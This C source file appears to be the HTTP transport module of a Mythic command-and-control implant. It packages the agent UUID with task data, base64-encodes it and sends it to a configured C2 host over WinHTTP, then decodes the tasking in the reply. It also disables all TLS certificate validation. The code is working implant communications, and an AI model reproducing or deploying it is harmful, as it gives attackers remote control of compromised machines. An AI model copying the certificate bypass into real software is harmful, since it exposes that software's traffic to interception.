#include "Transport.h"
#include "Utils.h"
#include "config.h"

#pragma comment(lib, "winhttp.lib")

// Basic transport abstraction layer - keeping it extensible
PParser sendAndReceive(PBYTE data, SIZE_T size)
{
#ifdef HTTP_TRANSPORT
    return makeHTTPRequest(data, size);
#endif

    // Placeholder for other cool transport protocols (DNS, SMB, etc.)
    return NULL;
}

// HTTP transport using WinHTTP API
PParser makeHTTPRequest(PBYTE data, SIZE_T size)
{
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    PParser   response = NULL;
    PBYTE     responseBuffer = NULL;
    SIZE_T    responseSize = 0;

    // Open WinHTTP session
    hSession = WinHttpOpen(
        nellConfig->userAgent,
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    if (!hSession)
        goto cleanup;

    // Connect to server
    hConnect = WinHttpConnect(
        hSession,
        nellConfig->hostName,
        (INTERNET_PORT)nellConfig->httpPort,
        0
    );
    if (!hConnect)
        goto cleanup;

    // Create request
    DWORD flags = nellConfig->isSSL ? WINHTTP_FLAG_SECURE : 0;
    hRequest = WinHttpOpenRequest(
        hConnect,
        nellConfig->httpMethod,
        nellConfig->endPoint,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        flags
    );
    if (!hRequest)
        goto cleanup;

    // If SSL, ignore certificate errors (for dev/testing)
    if (nellConfig->isSSL)
    {
        DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                         SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                         SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                         SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
    }

    // Send request with data
    LOG("[*] Transport: Sending %d bytes...", size);
    BOOL bResult = WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        (LPVOID)data,
        (DWORD)size,
        (DWORD)size,
        0
    );
    if (!bResult)
    {
        LOG("[-] Transport: WinHttpSendRequest failed");
        goto cleanup;
    }

    // Wait for response
    bResult = WinHttpReceiveResponse(hRequest, NULL);
    if (!bResult)
    {
        LOG("[-] Transport: WinHttpReceiveResponse failed");
        goto cleanup;
    }

    // Read response data
    DWORD bytesAvailable = 0;
    DWORD bytesRead = 0;
    
    LOG("[+] Transport: Received response.");

    do
    {
        bytesAvailable = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &bytesAvailable))
            break;

        if (bytesAvailable == 0)
            break;

        // Reallocate buffer to fit new data
        PBYTE newBuffer = (PBYTE)LocalReAlloc(
            responseBuffer ? responseBuffer : LocalAlloc(LPTR, 1),
            responseSize + bytesAvailable,
            LMEM_MOVEABLE | LMEM_ZEROINIT
        );
        if (!newBuffer)
            goto cleanup;

        responseBuffer = newBuffer;

        if (!WinHttpReadData(hRequest, responseBuffer + responseSize, bytesAvailable, &bytesRead))
            goto cleanup;

        responseSize += bytesRead;

    } while (bytesAvailable > 0);

    // Decode B64 response and create Parser
    if (responseBuffer && responseSize > 0)
    {
        SIZE_T decodedSize = 0;
        PBYTE decodedData = b64Decode((PCHAR)responseBuffer, responseSize, &decodedSize);
        
        if (decodedData && decodedSize > 0)
        {
            response = ParserCreate(decodedData, decodedSize);
            LocalFree(decodedData);
        }
    }

cleanup:
    if (responseBuffer)
        LocalFree(responseBuffer);
    if (hRequest)
        WinHttpCloseHandle(hRequest);
    if (hConnect)
        WinHttpCloseHandle(hConnect);
    if (hSession)
        WinHttpCloseHandle(hSession);

    return response;
}

// High-level: encode Package (with UUID prefix) to B64 and send
// Mythic expects: B64(UUID + DATA)
PParser sendPackage(PPackage package)
{
    if (!package || !package->buffer)
        return NULL;

    // Build: UUID + PackageData
    SIZE_T uuidLen = strlen(nellConfig->agentID);
    SIZE_T totalSize = uuidLen + package->length;
    
    PBYTE fullData = (PBYTE)LocalAlloc(LPTR, totalSize);
    if (!fullData)
        return NULL;

    // Copy UUID first, then package data
    memcpy(fullData, nellConfig->agentID, uuidLen);
    memcpy(fullData + uuidLen, package->buffer, package->length);

    // Encode to B64
    PCHAR packetToSend = b64Encode(fullData, totalSize);
    LocalFree(fullData);

    if (!packetToSend)
        return NULL;

    SIZE_T sizePacketToSend = b64EncodedSize(totalSize);

    // Send and receive
    PParser response = sendAndReceive((PBYTE)packetToSend, sizePacketToSend);

    LocalFree(packetToSend);

    return response;
}
